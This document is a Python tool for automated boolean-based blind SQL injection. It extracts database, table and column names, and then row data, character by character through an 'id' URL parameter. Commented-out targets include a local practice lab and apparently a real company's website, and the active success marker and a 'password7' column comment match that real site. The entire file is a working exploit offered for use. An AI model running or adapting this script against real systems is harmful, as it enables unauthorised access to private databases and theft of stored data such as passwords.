#! /usr/bin/env python
# _*_  coding:utf-8 _*_

import requests
import urllib.request
import time


def databaseLength(url):
    values = {}
    for i in range(1, 20):
        values['id'] = "1 and length(database())=%s#" % i
        toEncode = urllib.parse.urlencode(values)
        inputUrl = url+'?'+toEncode
        response = requests.get(inputUrl,headers=headers)
        if flag in response.content:
            print('database长度为',i)
            return i
            #time.sleep(1)

def databaseName(url):
    values = {}
    payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
    databasename = ''
    dblt = databaseLength(url)
    for i in range(1, dblt+1):
        for payload in payloads:
            values['id'] = "1 and ascii(substr(database(),%s,1))=%s#" % (i, ord(payload))
            toEncode = urllib.parse.urlencode(values)
            inputUrl = url + '?' + toEncode
            response = requests.get(inputUrl,headers=headers)
            if flag in response.content:
                databasename += payload
                print('name:',databasename)
                break
    return databasename
    #time.sleep(1)


def tableNumber(url):
    values = {}
    for i in range(1, 30):
        values['id'] = "1 and (select count(table_name) from information_schema.tables where table_schema=database())=%s#" % i
        toEncode = urllib.parse.urlencode(values)
        inputUrl = url + '?' + toEncode
        response = requests.get(inputUrl,headers=headers)
        if flag  in response.content:
            print('[*]当前库中表的数量为:',i)
            return i
            time.sleep(1)


def tableLength(url, number):
    values = {}
    for length in range(0, 99):
        values['id'] = "1 and (select length(table_name) from information_schema.tables where table_schema=database() limit %s,1)=%s#" % (
            number, length)
        toEncode = urllib.parse.urlencode(values)
        inputUrl = url + '?' + toEncode
        response = requests.get(inputUrl,headers=headers)
        if flag  in response.content:
            return length
            #time.sleep(1)


def tableName(url):
    values = {}
    payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
    tableNameList = []
    count = tableNumber(url)
    for i in range(0, count + 1):
        tableStr = ''
        tablelength = tableLength(url, i)
        if tablelength == None:
            break
        for length in range(0, tablelength+1):
            for payload in payloads:
                values['id'] = "1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1))=%s#" % (
                    i, length, ord(payload))
                toEncode = urllib.parse.urlencode(values)
                inputUrl = url + '?' + toEncode
                response = requests.get(inputUrl,headers=headers)
                if flag  in response.content:
                    tableStr += payload
                    print('tablename:',tableStr)
        tableNameList.append(tableStr)
    print('[*]当前表名为:', tableNameList)
    return tableNameList
    #time.sleep(1)


def columnNumber(url, table_name):
    values = {}
    for count in range(1, 99):
        values['id'] = "1  and (select count(column_name) from information_schema.columns where table_name="  + table_name  + ")=%s#" % count
        toEncode = urllib.parse.urlencode(values)
        inputUrl = url + '?' + toEncode
        response = requests.get(inputUrl,headers=headers)
        if flag  in response.content:
            print('[*]当前表中列的字段:', count)
            return count
            time.sleep(1)



def columnLength(url, table_name, number):
    values = {}
    for length in range(1, 100):
        limit = " limit %s,1)=%s#" % (number, length)
        values['id'] = "1  and (select length(column_name) from information_schema.columns where table_name="  + table_name  + limit
        data = urllib.parse.urlencode(values)
        geturl = url + '?' + data
        response = requests.get(geturl,headers=headers)
        if flag in response.content:
            return length
            time.sleep(1)

def columnName(url, table_name):
    values = {}
    payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
    columnNameList = []
    counts = columnNumber(url, table_name)
    for count in range(0, counts + 1):
        columnStr = ''
        columnlength = columnLength(url, table_name, count)
        if columnlength == None:
            break
        for length in range(0, columnlength+1):
            for payload in payloads:
                limit = " limit %s,1),%s,1))=%s#" % (
                    count, length, ord(payload))
                values['id'] = "1  and ascii(substr((select column_name from  information_schema.columns where table_name=" + table_name + limit
                toEncode = urllib.parse.urlencode(values)
                inputUrl = url + '?' + toEncode
                response = requests.get(inputUrl,headers=headers)
                if flag  in response.content:
                    columnStr += payload
        columnNameList.append(columnStr)
    print('[*]当前列名:', columnNameList)
    return columnNameList
    #time.sleep(1)

def dataLength(url, databases, table, column):
    values = {}
    for length in range(0, 99):
        values['id'] = "1  and (select count("+column+") from " + \
            databases+"."+table + ")=%s#" % (length)
        # 1' and (select count(username) from security.users)=13
        #values['id']= "1' and ascii(substr((select "+column+ "from" +databases+"."+table+limit
        toEncode = urllib.parse.urlencode(values)
        inputUrl = url + '?' + toEncode
        response = requests.get(inputUrl,headers=headers)
        if flag in response.content:
            print('[*]当前表中列的长度为:', length)
            return length
            #time.sleep(1)


def dataGet(url, databases, table, column):
    values = {}
    payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
    dataList = []
    counts = dataLength(url, databases, table, column)
    for count in range(0, counts+1):
        dataStr = ''
        for length in range(0, 12):
            for payload in payloads:
                limit = " limit %s,1),%s,1))=%s#" % (
                    count, length, ord(payload))
                # values['id'] = "1' and ascii(substr((select column_name from  information_schema.columns where table_name=" + "'" + table_name + "'" + limit
                #                          and ascii(substr((select password7 from xxchemical.dl limit 0,1),3,1))=99
                values['id'] = "1  and ascii(substr((select " + \
                    column + " from " + databases+"."+table+limit
                toEncode = urllib.parse.urlencode(values)
                inputUrl = url + '?' + toEncode
                response = requests.get(inputUrl,headers=headers)
                if flag in response.content:
                    dataStr += payload
        dataList.append(dataStr)
    print('[*]当前列下的数据:', dataList)
    return dataList
    #time.sleep(1)


if __name__ == '__main__':
    #url = 'http://192.168.31.182/sqli-labs-master/Less-8/'
    #url = 'http://www.zehanbiopharma.com/zhdetailpro.php'
    #flag = b'You are in...........'
    flag = b'Chemical Name:'
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'}
    #test=databaseLength(url)
    #print(test)
    databasename = databaseName(url)
    print('[*]当前库名:', databasename)
    T1 = tableNumber(url)
    T2 = tableLength(url, 0)
    T3 = tableName(url)
    # choiceTable=input('输入要爆破表名(最好16进制例如:0x646c):')
    # choiceTable=str(choiceTable)
    # T4 = columnNumber(url, choiceTable)
    # T5 = columnLength(url, choiceTable, 0)
    # T6 = columnName(url, choiceTable)
    # choiceColumn=input('输入要爆破的列名:')
    # T7 = dataLength(url, databasename, choiceTable, choiceColumn)
    # T8 = dataGet(url, databasename, choiceTable, choiceColumn)